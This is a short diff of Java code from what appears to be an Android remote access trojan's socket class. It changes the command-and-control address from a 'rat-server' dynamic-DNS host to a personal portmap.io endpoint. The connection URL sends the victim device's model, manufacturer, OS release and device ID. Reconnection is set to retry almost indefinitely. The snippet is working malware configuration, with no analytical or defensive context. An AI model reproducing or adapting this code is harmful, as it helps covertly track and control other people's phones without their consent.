@@ -26,7 +26,7 @@ public class IOSocket {
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
 
-            ioSocket = IO.socket("http://rat-server.ddns.net?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+            ioSocket = IO.socket("http://diptomondal-47482.portmap.io:47482?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
         } catch (URISyntaxException e) {
             e.printStackTrace();
         }
